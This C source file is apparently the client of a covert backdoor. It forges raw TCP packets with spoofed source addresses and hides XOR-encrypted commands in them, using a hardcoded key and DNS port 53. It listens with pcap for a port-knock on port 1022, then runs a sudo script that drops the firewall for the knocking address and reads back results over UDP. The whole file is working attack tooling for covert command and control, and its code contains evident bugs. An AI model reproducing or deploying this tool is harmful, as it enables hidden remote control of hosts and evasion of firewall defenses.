#include <stdio.h> //for printf
#include <string.h> //memset
#include <sys/socket.h>  //for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h> //Provides declarations for tcp header
#include <netinet/udp.h> //Provides declarations for tcp header
#include <netinet/ip.h>  //Provides declarations for ip header
#include <netinet/in.h>
#include "pkt_cap.h"
#include "misc.h"
#include <pthread.h>

#define MAXLINE 1000
#define ETHER_IP_TCP_LEN 54
#define PAYKEY "foobar"
void forge_packet(char *, char *, unsigned short, unsigned short, char *);
void packet_handler(u_char *, const struct pcap_pkthdr *, const u_char *);
void firewallThread(char *);
unsigned short in_cksum(unsigned short *, int);
char * xor(char *, char *);

char * xor(char * a, char * b)
{
        int i, x, y;
        x = strlen(a);
        y = strlen(b);
        for (i = 0; i < x; ++i)
                a[i] ^= b[(i%y)];
        return a;
}
/*
   96 bit (12 bytes) pseudo header needed for tcp header checksum calculation
 */
struct pseudo_header
{
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
};

/*
   Generic checksum calculation function
 */
unsigned short csum(unsigned short *ptr,int nbytes)
{
        register long sum;
        unsigned short oddbyte;
        register short answer;

        sum=0;
        while(nbytes>1) {
                sum+=*ptr++;
                nbytes-=2;
        }
        if(nbytes==1) {
                oddbyte=0;
                *((u_char*)&oddbyte)=*(u_char*)ptr;
                sum+=oddbyte;
        }

        sum = (sum>>16)+(sum & 0xffff);
        sum = sum + (sum>>16);
        answer=(short)~sum;

        return(answer);
}

int main (void)
{
  char *nic_dev;
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* nic_descr;
  struct bpf_program fp;    // holds compiled program
  bpf_u_int32 maskp;        // subnet mask
  bpf_u_int32 netp;         // ip
  u_char* args = NULL;
  char filter_string[] = "tcp dst port 1022";
  char buffer[100];
  char input[MAXLINE];
  char * eMessage[MAXLINE*2];
  char * uMessage[MAXLINE*2];
  char start[] = "start[";
  char end[] = "]end";
  char temp[MAXLINE*2];
  char tempS[MAXLINE*2];
  char tempP[MAXLINE*2];
  char tempY[MAXLINE*2];

  // find the first NIC that is up and sniff packets from it
  nic_dev =  "lo";
  //nic_dev = pcap_lookupdev(errbuf);

  if (nic_dev == NULL)
  {
          printf("%s\n",errbuf);
          exit(1);
  }

  // Use pcap to get the IP address and subnet mask of the device
  pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);


  // open the device for packet capture & set the device in promiscuous mode
  nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
  if (nic_descr == NULL)
  {
          printf("pcap_open_live(): %s\n",errbuf);
          exit(1);
  }

  // Compile the filter expression
  if (pcap_compile (nic_descr, &fp, filter_string, 0, netp) == -1)
  {
          fprintf(stderr,"Error calling pcap_compile\n");
          exit(1);
  }

  // Load the filter into the capture device
  if (pcap_setfilter (nic_descr, &fp) == -1)
  {
          fprintf(stderr,"Error setting filter\n");
          exit(1);
  }

  // Start the capture session

  //pcap_loop (nic_descr, 0, packet_handler, NULL);

  while(1)
  {
    printf("\nPrint message: ");
    fgets(input, MAXLINE, stdin);

    //Create command
    strcat(tempS,start);
    strcat(tempS,input);
    tempS[strlen(tempS)-1] = '\0';
    strcat(tempS,end);
    char message[strlen(tempS)];
    strcpy(message,tempS);
    printf("Unencrypted: %s\n", message);
    strcpy(eMessage, xor(message,PAYKEY));

    char *messageP;
    messageP = eMessage;
    forge_packet("127.0.0.1", "127.0.0.1", 7000, 53, messageP);

    // Start the capture session
    pcap_loop (nic_descr, 1, packet_handler, NULL);

    memset(message, 0x0, sizeof(message));
    memset(tempS, 0x0, sizeof(tempS));
  }

  return 0;
}

void forge_packet(char * source_addr, char * dest_addr, unsigned short source_port, unsigned short dest_port, char * messageP)
{
  int tcp;
  int udp;
  tcp = 1;
  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

  //Create a raw socket
  if (udp == 1)
  {
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_RAW);
  }

  if(s == -1)
  {
          //socket creation failed, may be because of non-root privileges
          perror("Failed to create socket");
          exit(1);
  }

  //Datagram to represent the packet
  char datagram[4096], source_ip[32], *data, *pseudogram;

  //zero out the packet buffer
  memset (datagram, 0, 4096);

  //IP header
  struct iphdr *iph = (struct iphdr *) datagram;

  //TCP header
  struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));

  //UDP header
  struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));

  struct sockaddr_in sin;
  struct pseudo_header psh;


  //Data part
  if (tcp == 1)
  {
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
  }
  else if (udp == 1)
  {
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
  }
  strcpy(data, messageP);

  /*Socket struct */
  sin.sin_family = AF_INET;
  sin.sin_port = htons(source_port);
  sin.sin_addr.s_addr = inet_addr(source_addr);

  // IP Header
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;

  if (tcp == 1)
  {
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->protocol = IPPROTO_TCP;
  }
  else if(udp == 1)
  {
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
    iph->protocol = IPPROTO_UDP;
  }

  iph->id = htonl (11111); //Id of this packet
  iph->frag_off = 0;
  iph->ttl = 255;
  iph->check = 0; //Set to 0 before calculating checksum
  iph->saddr = inet_addr (source_addr); //Spoof the source ip address
  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum ((unsigned short *) datagram, iph->tot_len);

  if (tcp == 1)
  {
    //TCP Header
    tcph->source = htons (source_port);
    tcph->dest = htons (dest_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; //tcp header size
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;
  }
  else if(udp == 1)
  {
    udph->source = htons (source_port);
    udph->dest = htons (dest_port);
    udph->len = htons(8 + strlen(data));
    udph->check = 0;
  }

  //TCP checksum
  psh.source_address = inet_addr(source_addr);
  psh.dest_address = sin.sin_addr.s_addr;
  psh.placeholder = 0;

  if (tcp == 1)
  {
  psh.protocol = IPPROTO_TCP;
  psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
  int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
  pseudogram = malloc(psize);
  memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
  memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
  tcph->check = csum( (unsigned short*) pseudogram, psize);
  }
  else if (udp == 1)
  {
    psh.protocol = IPPROTO_UDP;
    psh.tcp_length = htons(sizeof(struct udphdr) + strlen(data));
    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
    pseudogram = malloc(psize);
    memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + strlen(data));
    udph->check = csum( (unsigned short*) pseudogram, psize);
  }

  //IP_HDRINCL to tell the kernel that headers are included in the packet
  int one = 1;
  const int *val = &one;

  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
  {
          perror("Error setting IP_HDRINCL");
          exit(0);
  }

  //Send the packet
  if (sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
  {
          perror("sendto failed");
  }
  close(s);
}

void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
        int new_socket, valread;
        int opt = 1;
        char buffer1[MAXLINE];
        char message[MAXLINE];
        int sockfd, n;
        pthread_t thread_id;
        struct sockaddr_in servaddr;
        int servaddrlen = sizeof(servaddr);

        FILE *f;
        int len, loop, size_ip;
        int seq;
        int dport;
        char *source_addr;
        char *ptr, *ptr2;
        char decrypt[MAXLINE];
        char command[MAXLINE];
        const struct pcap_ip *ip;
        const struct pcap_udp *udp;
        const struct pcap_tcp *tcp;

        /* Step 1: locate the payload portion of the packet */
        ptr = (char *)(packet);// + ETHER_IP_TCP_LEN);

        ip = (struct pcap_ip *)(packet + SIZE_ETHERNET);
        size_ip = IP_HL(ip) * 4;

        udp = (struct pcap_ip *)(packet + SIZE_ETHERNET + size_ip);
        tcp = (struct pcap_ip *)(packet + SIZE_ETHERNET + size_ip);

        /* Retreive sequence number */
        seq = ptr[41];

        /* Get port number */
        dport = ntohs(tcp->tcph_destport);

        /* Get source IP address */
        source_addr = inet_ntoa(ip->ip_src);

        char dportS[sizeof(dport)+1];
        snprintf(dportS, sizeof(dportS), "%d", dport);

        /* Successful port knock */
        if (seq == 17 && strcmp(dportS, "1022") == 0)
        {
          /* Build firewall script string */
          char guard[256] = "sudo ./guard.sh ";
          strcat(guard, source_addr);
          strcat(guard, " ");
          strcat(guard, dportS+2);

          /* Drop firewall */
          //system(guard);
          pthread_create(&thread_id, NULL, firewallThread, guard);
          //pthread_join(thread_id, NULL);
          // clear servaddr
          bzero(&servaddr, sizeof(servaddr));
          servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
          servaddr.sin_port = htons(6000);
          servaddr.sin_family = AF_INET;

          // create datagram socket
          sockfd = socket(AF_INET, SOCK_DGRAM, 0);

          // connect to server
          if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
          {
              printf("\n Error : Connect Failed \n");
              exit(0);
          }

          recvfrom(sockfd, buffer1, sizeof(buffer1), 0, (struct sockaddr*)NULL, NULL);

          printf("%s\n", buffer1);
        }
        close(fd);
        return;
}

void firewallThread(char *guard)
{
  system(guard);
  return;
}
